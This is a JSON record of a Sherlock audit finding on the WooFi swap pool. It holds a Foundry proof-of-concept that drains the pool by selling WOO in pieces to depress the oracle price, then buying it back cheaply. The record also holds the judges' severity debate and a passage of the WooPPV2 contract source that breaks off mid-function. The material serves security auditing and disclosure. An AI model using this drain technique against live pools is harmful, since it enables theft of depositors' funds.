{
  "Title": "H-1: Pool can be drained",
  "Content": "# Issue H-1: Pool can be drained \n\nSource: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/68 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nmstpr-brainbot\n## Summary\nThe pool can be drained just as it was during the incident that occurred previously.\n## Vulnerability Detail\n`maxNotionalSwap` and `maxGamma` and the new math formula do not prevent the pool being drainable. Same attack vector that happent previously is still applicable:\nhttps://woo.org/blog/en/woofi-spmm-exploit-post-mortem\nhttps://rekt.news/woo-rekt/\n\nFlashloan 99989999999999999990000 (99_990) WOO\nSell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go\nSell 20 USDC and get 199779801821639475527975 (199_779) WOO\nRepay flashloan, pocket the rest of the 100K WOO.\n\n**Coded PoC:**\n```solidity\nfunction test_Exploit() public {\n        // Flashloan 99989999999999999990000 (99_990) WOO\n        // Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go\n        // Sell 20 USDC and get 199779801821639475527975 (199_779) WOO\n        // Repay flashloan, pocket the rest of the 100K WOO. \n\n        // Reference values: \n        // s = 0.1, p = 1, c = 0.0001 \n\n        // bootstrap the pool \n        uint usdcAmount = 100_0000_0_0000000000000_000;\n        deal(USDC, ADMIN, usdcAmount);\n        deal(WOO, ADMIN, usdcAmount);\n        deal(WETH, ADMIN, usdcAmount);\n        vm.startPrank(ADMIN);\n        IERC20(USDC).approve(address(pool), type(uint256).max);\n        IERC20(WOO).approve(address(pool), type(uint256).max);\n        IERC20(WETH).approve(address(pool), type(uint256).max);\n        pool.depositAll(USDC);\n        pool.depositAll(WOO);\n        pool.depositAll(WETH);\n        vm.stopPrank();\n        ////////////////////////\n\n        // fund mr TAPIR\n        vm.startPrank(TAPIR);\n        uint wooAmountForTapir = 9999 * 1e18 - 1000;\n        deal(WOO, TAPIR, wooAmountForTapir * 10);\n        IERC20(USDC).approve(address(router), type(uint256).max);\n        IERC20(WOO).approve(address(router), type(uint256).max);\n        IERC20(WETH).approve(address(router), type(uint256).max);\n        vm.stopPrank();\n        ////////////////////////\n        \n        // get the price before the swaps\n        (uint128 price, ) = oracle.woPrice(WOO);\n        console.log(\"Price before the swap\", price);\n\n        // here, we assume maxGamma and maxNotionalSwap can save us. However, due to how AMM behaves\n        // partial swaps in same tx will also work and it will be even more profitable! \n        uint cumulative;\n        for (uint i; i < 10; ++i) {\n            vm.prank(TAPIR);\n            cumulative += router.swap(WOO, USDC, wooAmountForTapir, 0, payable(TAPIR), TAPIR);\n        }\n\n        // how much we bought and what's the final swap? \n        console.log(\"USDC bought after swaps\", cumulative);\n        (price, ) = oracle.woPrice(WOO);\n        console.log(\"Price after swap\", price);\n\n        // sell 20 USDC, how much WOO we get? (199779801821639475527975)\n        vm.prank(TAPIR);\n        uint receivedWOO = router.swap(USDC, WOO, 20 * 1e6, 0, payable(TAPIR), TAPIR);\n        console.log(\"Received WOO\", receivedWOO); // 199779801821639475527975 (10x)\n        console.log(\"Total WOO flashloaned\", wooAmountForTapir * 10); // 99989999999999999990000\n\n        // attack is succesfull \n        assertGe(receivedWOO, wooAmountForTapir * 10);\n    }\n```\n## Impact\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L420-L465\n## Tool used\n\nManual Review\n\n## Recommendation\n\n\n\n## Discussion\n\n**fb-alexcq**\n\n\nThis extreme price-deviation case has already been handled by price check (against Chainlink) in our Wooracle's price function.\n\n\n\n**mstpr**\n\n@fb-alexcq \ncorrect, but some tokens like WOO does not have chainlink price feeds in other networks, in that case the attack is feasible\n\n**fb-alexcq**\n\nThanks for the feedback. \n\nWe already decided to never support any token which are unavailable in Chainlink, right after we got exploited a month ago. And this is the only way to fix it; otherwise, the project cannot run again.\n\n**WangSecurity**\n\nThe info about not using tokens that don't have Chainlink price feeds is not in README. Moreover, the README says any standard token. Therefore, aproppriate severity is High.\n\n**WangSecurity**\n\nI've consulted on this issue with the Head of Judging and decided to invalidate it, since such tokens wouln't be used. The README says \"any\" ERC20 token, therefore, it's expected tokens without the any weird traits will be used.\n\n**mstpr**\n\nEscalate\n\nEvery ERC20 can be used, tokens that does not have a a chainlink price feed set is not considered as \"weird\" tokens as per Sherlock:\nhttps://github.com/d-xo/weird-erc20\n\nAlso, the current scope of contracts indeed assumes that there can be tokens used that does not have chainlink price feeds\nhttps://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L247-L255\n\nAdditionally, the README does not states that tokens that have no chainlink oracle will not be used. Though, this would be contradictory anyways since the current code has an extra logic to handle tokens without the chainlink price feed.\n\nAlso, the deployed chains are as follows in README:\nArbitrum, Optimism, Base, Avalanche, BSC, Polygon PoS, Mantle, Fantom, Polygon zkEVM, zkSync, Linea\nThere are lots of tokens that does not have chainlink price feed and have very high liquidity on some of them. For example, the WOO token has no price feeds, SOL token doesn't have price feed in Linea, zkSyncEVM, MATIC token doesn't have price feed in Linea, Scroll, Base etc. \n\nConsidering how serious the issue is and the above, this issue should be definitely considered as a high issue.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> Every ERC20 can be used, tokens that does not have a a chainlink price feed set is not considered as \"weird\" tokens as per Sherlock:\n> https://github.com/d-xo/weird-erc20\n> \n> Also, the current scope of contracts indeed assumes that there can be tokens used that does not have chainlink price feeds\n> https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L247-L255\n> \n> Additionally, the README does not states that tokens that have no chainlink oracle will not be used. Though, this would be contradictory anyways since the current code has an extra logic to handle tokens without the chainlink price feed.\n> \n> Also, the deployed chains are as follows in README:\n> Arbitrum, Optimism, Base, Avalanche, BSC, Polygon PoS, Mantle, Fantom, Polygon zkEVM, zkSync, Linea\n> There are lots of tokens that does not have chainlink price feed and have very high liquidity on some of them. For example, the WOO token has no price feeds, SOL token doesn't have price feed in Linea, zkSyncEVM, MATIC token doesn't have price feed in Linea, Scroll, Base etc. \n> \n> Considering how serious the issue is and the above, this issue should be definitely considered as a high issue.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**WangSecurity**\n\nAgree with everything that tapir says above, but want to note that I've consulted with the head of judging before making this decision. But, I agree that I may have phrased the problem not very clearly and will send what I've said to the head of judging about it.\n\nMy message: \"in some issues the problem is that tokens don't have chainlink's price feed, but the sponsor says they will only use tokens with the feeds.\"\n\nThe head of judging said this doesn't sound like a vulnerability.\n\nAfter that I also added: \"oh, sorry, I missed for the first one, it allowed to drain the entire pool, but still it required to whitelist tokens without the price feed, which they didn't intend to do.\" and head of judging is reacted with a thumbs up emoji.\n\nI don't say that tapir is wrong and agree with his reasons, therefore, I will accept it decision from the head of judging. Just wanted to note why it's invalidated.\n\n\n**Czar102**\n\nI think the fact that there are special fragments of code to handle the no oracle cases is a game-changer in this judgment. Without that detail, this would clearly be an admin misconfiguration, but it seems that tokens without a Chainlink feed were intended (or allowed) to be used.\n\nGiven that it wasn't noted anywhere (to my best knowledge) that this fragment of the code will never be used, i.e. all whitelisted tokens will have a Chainlink feed, I am planning to consider this a valid High severity issue. \n\n**WangSecurity**\n\nGreat issue @mstpr !\n\n**Czar102**\n\nResult:\nHigh\nUnique\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [mstpr](https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/68/#issuecomment-2039575831): accepted\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/277",
  "Code": [
    {
      "filename": "WooPoolV2/contracts/WooPPV2.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity =0.8.14;\n\n/*\n\n░██╗░░░░░░░██╗░█████╗░░█████╗░░░░░░░███████╗██╗\n░██║░░██╗░░██║██╔══██╗██╔══██╗░░░░░░██╔════╝██║\n░╚██╗████╗██╔╝██║░░██║██║░░██║█████╗█████╗░░██║\n░░████╔═████║░██║░░██║██║░░██║╚════╝██╔══╝░░██║\n░░╚██╔╝░╚██╔╝░╚█████╔╝╚█████╔╝░░░░░░██║░░░░░██║\n░░░╚═╝░░░╚═╝░░░╚════╝░░╚════╝░░░░░░░╚═╝░░░░░╚═╝\n\n*\n* MIT License\n* ===========\n*\n* Copyright (c) 2020 WooTrade\n*\n* Permission is hereby granted, free of charge, to any person obtaining a copy\n* of this software and associated documentation files (the \"Software\"), to deal\n* in the Software without restriction, including without limitation the rights\n* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n* copies of the Software, and to permit persons to whom the Software is\n* furnished to do so, subject to the following conditions:\n*\n* The above copyright notice and this permission notice shall be included in all\n* copies or substantial portions of the Software.\n*\n* THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n*/\n\nimport \"./interfaces/IWooracleV2.sol\";\nimport \"./interfaces/IWooPPV2.sol\";\nimport \"./interfaces/AggregatorV3Interface.sol\";\nimport \"./interfaces/IWooLendingManager.sol\";\n\nimport {TransferHelper} from \"@uniswap/v3-periphery/contracts/libraries/TransferHelper.sol\";\n\n// OpenZeppelin contracts\nimport {Ownable} from \"@openzeppelin/contracts/access/Ownable.sol\";\nimport {ReentrancyGuard} from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {Pausable} from \"@openzeppelin/contracts/security/Pausable.sol\";\nimport {IERC20Metadata} from \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\n\n// REMOVE IT IN PROD\n// import \"hardhat/console.sol\";\n\n/// @title Woo pool for token swap, version 2.\n/// @notice the implementation class for interface IWooPPV2, mainly for query and swap tokens.\ncontract WooPPV2 is Ownable, ReentrancyGuard, Pausable, IWooPPV2 {\n    /* ----- Type declarations ----- */\n    struct DecimalInfo {\n        uint64 priceDec; // 10**(price_decimal)\n        uint64 quoteDec; // 10**(quote_decimal)\n        uint64 baseDec; // 10**(base_decimal)\n    }\n\n    struct TokenInfo {\n        uint192 reserve; // balance reserve\n        uint16 feeRate; // 1 in 100000; 10 = 1bp = 0.01%; max = 65535\n        uint128 maxGamma; // max range of `balance * k`\n        uint128 maxNotionalSwap; // max volume per swap\n    }\n\n    /* ----- State variables ----- */\n    address constant ETH_PLACEHOLDER_ADDR = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n\n    uint256 public unclaimedFee; // NOTE: in quote token\n\n    // wallet address --> is admin\n    mapping(address => bool) public isAdmin;\n\n    // wallet address --> is pause role\n    mapping(address => bool) public isPauseRole;\n\n    // token address --> fee rate\n    mapping(address => TokenInfo) public tokenInfos;\n\n    /// @inheritdoc IWooPPV2\n    address public immutable override quoteToken;\n\n    IWooracleV2 public wooracle;\n\n    address public feeAddr;\n\n    mapping(address => IWooLendingManager) public lendManagers;\n\n    /* ----- Modifiers ----- */\n\n    modifier onlyAdmin() {\n        require(msg.sender == owner() || isAdmin[msg.sender], \"WooPPV2: !admin\");\n        _;\n    }\n\n    modifier onlyAdminOrPauseRole() {\n        require(msg.sender == owner() || isAdmin[msg.sender] || isPauseRole[msg.sender], \"WooPPV2: !isPauseRole\");\n        _;\n    }\n\n    constructor(address _quoteToken) {\n        quoteToken = _quoteToken;\n    }\n\n    function init(address _wooracle, address _feeAddr) external onlyOwner {\n        require(address(wooracle) == address(0), \"WooPPV2: INIT_INVALID\");\n        wooracle = IWooracleV2(_wooracle);\n        feeAddr = _feeAddr;\n    }\n\n    /* ----- External Functions ----- */\n\n    /// @inheritdoc IWooPPV2\n    function tryQuery(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount\n    ) external view override returns (uint256 toAmount) {\n        if (fromToken == quoteToken) {\n            toAmount = _tryQuerySellQuote(toToken, fromAmount);\n        } else if (toToken == quoteToken) {\n            toAmount = _tryQuerySellBase(fromToken, fromAmount);\n        } else {\n            (toAmount, ) = _tryQueryBaseToBase(fromToken, toToken, fromAmount);\n        }\n    }\n\n    /// @inheritdoc IWooPPV2\n    function query(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount\n    ) external view override returns (uint256 toAmount) {\n        if (fromToken == quoteToken) {\n            toAmount = _tryQuerySellQuote(toToken, fromAmount);\n        } else if (toToken == quoteToken) {\n            toAmount = _tryQuerySellBase(fromToken, fromAmount);\n        } else {\n            uint256 swapFee;\n            (toAmount, swapFee) = _tryQueryBaseToBase(fromToken, toToken, fromAmount);\n            require(swapFee <= tokenInfos[quoteToken].reserve, \"WooPPV2: INSUFF_QUOTE_FOR_SWAPFEE\");\n        }\n        require(toAmount <= tokenInfos[toToken].reserve, \"WooPPV2: INSUFF_BALANCE\");\n    }\n\n    /// @inheritdoc IWooPPV2\n    function swap(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount,\n        uint256 minToAmount,\n        address to,\n        address rebateTo\n    ) external override returns (uint256 realToAmount) {\n        if (fromToken == quoteToken) {\n            // case 1: quoteToken --> baseToken\n            realToAmount = _sellQuote(toToken, fromAmount, minToAmount, to, rebateTo);\n        } else if (toToken == quoteToken) {\n            // case 2: fromToken --> quoteToken\n            realToAmount = _sellBase(fromToken, fromAmount, minToAmount, to, rebateTo);\n        } else {\n            // case 3: fromToken --> toToken (base to base)\n            realToAmount = _swapBaseToBase(fromToken, toToken, fromAmount, minToAmount, to, rebateTo);\n        }\n    }\n\n    /// @dev OKAY to be public method\n    function claimFee() external nonReentrant {\n        require(feeAddr != address(0), \"WooPPV2: !feeAddr\");\n        uint256 amountToTransfer = unclaimedFee;\n        unclaimedFee = 0;\n        TransferHelper.safeTransfer(quoteToken, feeAddr, amountToTransfer);\n    }\n\n    /// @inheritdoc IWooPPV2\n    /// @dev pool size = tokenInfo.reserve\n    function poolSize(address token) public view override returns (uint256) {\n        return tokenInfos[token].reserve;\n    }\n\n    /// @dev User pool balance (substracted unclaimed fee)\n    function balance(address token) public view returns (uint256) {\n        return token == quoteToken ? _rawBalance(token) - unclaimedFee : _rawBalance(token);\n    }\n\n    function decimalInfo(address baseToken) public view returns (DecimalInfo memory) {\n        return\n            DecimalInfo({\n                priceDec: uint64(10)**(IWooracleV2(wooracle).decimals(baseToken)), // 8\n                quoteDec: uint64(10)**(IERC20Metadata(quoteToken).decimals()), // 18 or 6\n                baseDec: uint64(10)**(IERC20Metadata(baseToken).decimals()) // 18 or 8\n            });\n    }\n\n    /* ----- Admin Functions ----- */\n\n    function setWooracle(address _wooracle) external onlyAdmin {\n        wooracle = IWooracleV2(_wooracle);\n        emit WooracleUpdated(_wooracle);\n    }\n\n    function setFeeAddr(address _feeAddr) external onlyAdmin {\n        feeAddr = _feeAddr;\n        emit FeeAddrUpdated(_feeAddr);\n    }\n\n    function setFeeRate(address token, uint16 rate) external onlyAdmin {\n        require(rate <= 1e5, \"!rate\");\n        tokenInfos[token].feeRate = rate;\n    }\n\n    function setMaxGamma(address token, uint128 maxGamma) external onlyAdmin {\n        tokenInfos[token].maxGamma = maxGamma;\n    }\n\n    function setMaxNotionalSwap(address token, uint128 maxNotionalSwap) external onlyAdmin {\n        tokenInfos[token].maxNotionalSwap = maxNotionalSwap;\n    }\n\n    function setTokenInfo(\n        address token,\n        uint16 _feeRate,\n        uint128 _maxGamma,\n        uint128 _maxNotionalSwap\n    ) external onlyAdmin {\n        tokenInfos[token].feeRate = _feeRate;\n        tokenInfos[token].maxGamma = _maxGamma;\n        tokenInfos[token].maxNotionalSwap = _maxNotionalSwap;\n    }\n\n    function pause() external onlyAdminOrPauseRole {\n        super._pause();\n    }\n\n    function unpause() external onlyAdmin {\n        super._unpause();\n    }\n\n    function setAdmin(address addr, bool flag) external onlyAdmin {\n        require(addr != address(0), \"WooPPV2: !admin\");\n        isAdmin[addr] = flag;\n        emit AdminUpdated(addr, flag);\n    }\n\n    function setPauseRole(address addr, bool flag) external onlyAdmin {\n        isPauseRole[addr] = flag;\n        emit PauseRoleUpdated(addr, flag);\n    }\n\n    function deposit(address token, uint256 amount) public override nonReentrant onlyAdmin {\n        uint256 balanceBefore = balance(token);\n        TransferHelper.safeTransferFrom(token, msg.sender, address(this), amount);\n        uint256 amountReceived = balance(token) - balanceBefore;\n        require(amountReceived >= amount, \"AMOUNT_INSUFF\");\n\n        tokenInfos[token].reserve = uint192(tokenInfos[token].reserve + amount);\n\n        emit Deposit(token, msg.sender, amount);\n    }\n\n    function depositAll(address token) external onlyAdmin {\n        deposit(token, IERC20(token).balanceOf(msg.sender));\n    }\n\n    function repayWeeklyLending(address wantToken) external nonReentrant onlyAdmin returns (uint256 repaidAmount) {\n        IWooLendingManager lendManager = lendManagers[wantToken];\n        lendManager.accureInterest();\n        uint256 amount = lendManager.weeklyRepayment();\n        address repaidToken = lendManager.want();\n        if (amount > 0) {\n            tokenInfos[repaidToken].reserve = uint192(tokenInfos[repaidToken].reserve - amount);\n            TransferHelper.safeApprove(repaidToken, address(lendManager), amount);\n            repaidAmount = lendManager.repayWeekly();\n            TransferHelper.safeApprove(repaidToken, address(lendManager), 0);\n        }\n        emit Withdraw(repaidToken, address(lendManager), amount);\n    }\n\n    function repayPrincipal(address wantToken, uint256 principalAmount)\n        external\n        nonReentrant\n        onlyAdmin\n        returns (uint256 repaidAmount)\n    {\n        IWooLendingManager lendManager = lendManagers[wantToken];\n        lendManager.accureInterest();\n\n        uint256 interest = lendManager.borrowedInterest();\n        uint256 perfFee = (lendManager.perfRate() * interest) / 10000;\n\n        uint256 amount = principalAmount + interest + perfFee;\n\n        address repaidToken = lendManager.want();\n        if (amount > 0) {\n            tokenInfos[repaidToken].reserve = uint192(tokenInfos[repaidToken].reserve - amount);\n            TransferHelper.safeApprove(repaidToken, address(lendManager), amount);\n            repaidAmount = lendManager.repayPrincipal(principalAmount);\n            TransferHelper.safeApprove(repaidToken, address(lendManager), 0);\n        }\n        emit Withdraw(repaidToken, address(lendManager), amount);\n    }\n\n    function withdraw(address token, uint256 amount) public nonReentrant onlyAdmin {\n        require(tokenInfos[token].reserve >= amount, \"WooPPV2: !amount\");\n        tokenInfos[token].reserve = uint192(tokenInfos[token].reserve - amount);\n        TransferHelper.safeTransfer(token, owner(), amount);\n        emit Withdraw(token, owner(), amount);\n    }\n\n    function withdrawAll(address token) external onlyAdmin {\n        withdraw(token, poolSize(token));\n    }\n\n    function skim(address token) public nonReentrant onlyAdmin {\n        TransferHelper.safeTransfer(token, owner(), balance(token) - tokenInfos[token].reserve);\n    }\n\n    function skimMulTokens(address[] memory tokens) external nonReentrant onlyAdmin {\n        unchecked {\n            uint256 len = tokens.length;\n            for (uint256 i = 0; i < len; i++) {\n                skim(tokens[i]);\n            }\n        }\n    }\n\n    function sync(address token) external nonReentrant onlyAdmin {\n        tokenInfos[token].reserve = uint192(balance(token));\n    }\n\n    /* ----- Owner Functions ----- */\n\n    function setLendManager(IWooLendingManager _lendManager) external onlyOwner {\n        lendManagers[_lendManager.want()] = _lendManager;\n        isAdmin[address(_lendManager)] = true;\n        emit AdminUpdated(address(_lendManager), true);\n    }\n\n    function migrateToNewPool(address token, address newPool) external onlyOwner {\n        require(token != address(0), \"WooPPV2: !token\");\n        require(newPool != address(0), \"WooPPV2: !newPool\");\n\n        tokenInfos[token].reserve = 0;\n\n        uint256 bal = balance(token);\n        TransferHelper.safeApprove(token, newPool, bal);\n        WooPPV2(newPool).depositAll(token);\n\n        emit Migrate(token, newPool, bal);\n    }\n\n    function inCaseTokenGotStuck(address stuckToken) external onlyOwner {\n        if (stuckToken == ETH_PLACEHOLDER_ADDR) {\n            TransferHelper.safeTransferETH(msg.sender, address(this).balance);\n        } else {\n            uint256 amount = IERC20(stuckToken).balanceOf(address(this));\n            TransferHelper.safeTransfer(stuckToken, msg.sender, amount);\n        }\n    }\n\n    /* ----- Private Functions ----- */\n\n    function _tryQuerySellBase(address baseToken, uint256 baseAmount)\n        private\n        view\n        whenNotPaused\n        returns (uint256 quoteAmount)\n    {\n        IWooracleV2.State memory state = IWooracleV2(wooracle).state(baseToken);\n        (quoteAmount, ) = _calcQuoteAmountSellBase(baseToken, baseAmount, state);\n        uint256 fee = (quoteAmount * tokenInfos[baseToken].feeRate) / 1e5;\n        quoteAmount = quoteAmount - fee;\n    }\n\n    function _tryQuerySellQuote(address baseToken, uint256 quoteAmount)\n        private\n        view\n        whenNotPaused\n        returns (uint256 baseAmount)\n    {\n        uint256 swapFee = (quoteAmount * tokenInfos[baseToken].feeRate) / 1e5;\n        quoteAmount = quoteAmount - swapFee;\n        IWooracleV2.State memory state = IWooracleV2(wooracle).state(baseToken);\n        (baseAmount, ) = _calcBaseAmountSellQuote(baseToken, quoteAmount, state);\n    }\n\n    function _tryQueryBaseToBase(\n        address baseToken1,\n        address baseToken2,\n        uint256 base1Amount\n    ) private view whenNotPaused returns (uint256 base2Amount, uint256 swapFee) {\n        if (\n            baseToken1 == address(0) || baseToken2 == address(0) || baseToken1 == quoteToken || baseToken2 == quoteToken\n        ) {\n            return (0, 0);\n        }\n\n        IWooracleV2.State memory state1 = IWooracleV2(wooracle).state(baseToken1);\n        IWooracleV2.State memory state2 = IWooracleV2(wooracle).state(baseToken2);\n\n        uint64 spread = _maxUInt64(state1.spread, state2.spread) / 2;\n        uint16 feeRate = _maxUInt16(tokenInfos[baseToken1].feeRate, tokenInfos[baseToken2].feeRate);\n\n        state1.spread = spread;\n        state2.spread = spread;\n\n        (uint256 quoteAmount, ) = _calcQuoteAmountSellBase(baseToken1, base1Amount, state1);\n\n        swapFee = (quoteAmount * feeRate) / 1e5;\n        quoteAmount = quoteAmount - swapFee;\n\n        (base2Amount, ) = _calcBaseAmountSellQuote(baseToken2, quoteAmount, state2);\n    }\n\n    function _sellBase(\n        address baseToken,\n        uint256 baseAmount,\n        uint256 minQuoteAmount,\n        address to,\n        address rebateTo\n    ) private nonReentrant whenNotPaused returns (uint256 quoteAmount) {\n        require(baseToken != address(0), \"WooPPV2: !baseToken\");\n        require(to != address(0), \"WooPPV2: !to\");\n        require(baseToken != quoteToken, \"WooPPV2: baseToken==quoteToken\");\n\n        require(balance(baseToken) - tokenInfos[baseToken].reserve >= baseAmount, \"WooPPV2: !BASE\");\n\n        {\n            uint256 newPrice;\n            IWooracleV2.State memory state = IWooracleV2(wooracle).state(baseToken);\n            (quoteAmount, newPrice) = _calcQuoteAmountSellBase(baseToken, baseAmount, state);\n            IWooracleV2(wooracle).postPrice(baseToken, uint128(newPrice));\n            // console.log('Post new price:', newPrice, newPrice/1e8);\n        }\n\n        uint256 swapFee = (quoteAmount * tokenInfos[baseToken].feeRate) / 1e5;\n        quoteAmount = quoteAmount - swapFee;\n        require(quoteAmount >= minQuoteAmount, \"WooPPV2: quoteAmount_LT_minQuoteAmount\");\n\n        unclaimedFee = unclaimedFee + swapFee;\n\n        tokenInfos[baseToken].reserve = uint192(tokenInfos[baseToken].reserve + baseAmount);\n        tokenInfos[quoteToken].reserve = uint192(tokenInfos[quoteToken].reserve - quoteAmount - swapFee);\n\n        if (to != address(this)) {\n            TransferHelper.safeTransfer(quoteToken, to, quoteAmount);\n        }\n\n        emit WooSwap(\n            baseToken,\n            quoteToken,\n            baseAmount,\n            quoteAmount,\n            msg.sender,\n            to,\n            rebateTo,\n            quoteAmount + swapFee,\n            swapFee\n        );\n    }\n\n    function _sellQuote(\n        address baseToken,\n        uint256 quoteAmount,\n        uint256 minBaseAmount,\n        address to,\n        address rebateTo\n    ) private nonReentrant whenNotPaused returns (uint256 baseAmount) {\n        require(baseToken != address(0), \"WooPPV2: !baseToken\");\n        require(to != address(0), \"WooPPV2: !to\");\n        require(baseToken != quoteToken, \"WooPPV2: baseToken==quoteToken\");\n\n        require(balance(quoteToken) - tokenInfos[quoteToken].reserve >= quoteAmount, \"WooPPV2: !QUOTE\");\n\n        uint256 swapFee = (quoteAmount * tokenInfos[baseToken].feeRate) / 1e5;\n        quoteAmount = quoteAmount - swapFee;\n        unclaimedFee = unclaimedFee + swapFee;\n\n        {\n            uint256 newPrice;\n            IWooracleV2.State memory state = IWooracleV2(wooracle).state(baseToken);\n            (baseAmount, newPrice) = _calcBaseAmountSellQuote(baseToken, quoteAmount, state);\n            IWooracleV2(wooracle).postPrice(baseToken, uint128(newPrice));\n            // console.log('Post new price:', newPrice, newPrice/1e8);\n            require(baseAmount >= minBaseAmount, \"WooPPV2: baseAmount_LT_minBaseAmount\");\n        }\n\n        tokenInfos[baseToken].reserve = uint192(tokenInfos[baseToken].reserve - baseAmount);\n        tokenInfos[quoteToken].reserve = uint192(tokenInfos[quoteToken].reserve + quoteAmount);\n\n        if (to != address(this)) {\n            TransferHelper.safeTransfer(baseToken, to, baseAmount);\n        }\n\n        emit WooSwap(\n            quoteToken,\n            baseToken,\n            quoteAmount + swapFee,\n            baseAmount,\n            msg.sender,\n            to,\n            rebateTo,\n            quoteAmount + swapFee,\n            swapFee\n        );\n    }\n\n    function _swapBaseToBase(\n        address baseToken1,\n        address baseToken2,\n        uint256 base1Amount,\n        uint256 minBase2Amount,\n        address to,\n        address rebateTo\n    ) private nonReentrant whenNotPaused returns (uint256 base2Amount) {\n        require(baseToken1 != address(0) && baseToken1 != quoteToken, \"WooPPV2: !baseToken1\");\n        require(baseToken2 != address(0) && baseToken2 != quoteToken, \"WooPPV2: !baseToken2\");\n        require(to != address(0), \"WooPPV2: !to\");\n\n        require(balance(baseToken1) - tokenInfos[baseToken1].reserve >= base1Amount, \"WooPPV2: !BASE1_BALANCE\");\n\n        IWooracleV2.State memory state1 = IWooracleV2(wooracle).state(baseToken1);\n        IWooracleV2.State memory state2 = IWooracleV2(wooracle).state(baseToken2);\n\n        uint256 swapFee;\n        uint256 quoteAmount;\n        {\n            uint64 spread = _maxUInt64(state1.spread, state2.spread) / 2;\n            uint16 feeRate = _maxUInt16(tokenInfos[baseToken1].feeRate, tokenInfos[baseToken2].feeRate);\n\n            state1.spread = spread;\n            state2.spread = spread;\n\n            uint256 newBase1Price;\n            (quoteAmount, newBase1Price) = _calcQuoteAmountSellBase(baseToken1, base1Amount, state1);\n            IWooracleV2(wooracle).postPrice(baseToken1, uint128(newBase1Price));\n            // console.log('Post new base1 price:', newBase1Price, newBase1Price/1e8);\n\n            swapFee = (quoteAmount * feeRate) / 1e5;\n        }\n\n        quoteAmount = quoteAmount - swapFee;\n        unclaimedFee = unclaimedFee + swapFee;\n\n        tokenInfos[quoteToken].reserve = uint192(tokenInfos[quoteToken].reserve - swapFee);\n        tokenInfos[baseToken1].reserve = uint192(tokenInfos[baseToken1].reserve + base1Amount);\n\n        {\n            uint256 newBase2Price;\n            (base2Amount, newBase2Price) = _calcBaseAmountSellQuote(baseToken2, quoteAmount, state2);\n            IWooracleV2(wooracle).postPrice(baseToken2, uint128(newBase2Price));\n            // console.log('Post new base2 price:', newBase2Price, newBase2Price/1e8);\n            require(base2Amount >= minBase2Amount, \"WooPPV2: base2Amount_LT_minBase2Amount\");\n        }\n\n        tokenInfos[baseToken2].reserve = uint192(tokenInfos[baseToken2].reserve - base2Amount);\n\n        if (to != address(this)) {\n            TransferHelper.safeTransfer(baseToken2, to, base2Amount);\n        }\n\n        emit WooSwap(\n            baseToken1,\n            baseToken2,\n            base1Amount,\n            base2Amount,\n            msg.sender,\n            to,\n            rebateTo,\n            quoteAmount + swapFee,\n            swapFee\n        );\n    }\n\n    /// @dev Get the pool's balance of the specified token\n    /// @dev This function is gas optimized to avoid a redundant extcodesize check in addition to the returndatasize\n    /// @dev forked and curtesy by Uniswap v3 core\n    function _rawBalance(address token) private view returns (uint256) {\n        (bool success, bytes memory data) = token.staticcall(\n            abi.encodeWithSelector(IERC20.balanceOf.selector, address(this))\n        );\n        require(success && data.length >= 32, \"WooPPV2: !BALANCE\");\n        return abi.decode(data, (uint256));\n    }\n\n    function _calcQuoteAmountSellBase(\n        address baseToken,\n        uint256 baseAmount,\n        IWooracleV2.State memory state\n    ) private view returns (uint256 quoteAmount, uint256 newPrice) {\n        require(state.woFeasible, \"WooPPV2: !ORACLE_FEASIBLE\");\n\n        DecimalInfo memory decs = decimalInfo(baseToken);\n\n        // gamma = k * price * base_amount; and decimal 18\n        uint256 gamma;\n        {\n            uint256 notionalSwap = (baseAmount * state.price * decs.quoteDec) / decs.baseDec / decs.priceDec;\n            require(notionalSwap <= tokenInfos[baseToken].maxNotionalSwap, \"WooPPV2: !maxNotionalValue\");\n\n            gamma = (baseAmount * state.price * state.coeff) / decs.priceDec / decs.baseDec;\n            require(gamma <= tokenInfos[baseToken].maxGamma, \"WooPPV2: !gamma\");\n\n            // Formula: quoteAmount = baseAmount * oracle.price * (1 - oracle.k * baseAmount * oracle.price - oracle.spread)\n            quoteAmount =\n                (((baseAmount * state.price * decs.quoteDec) / decs.priceDec) *\n                    (uint256(1e18) - gamma - state.spread)) /\n                1e18 /\n                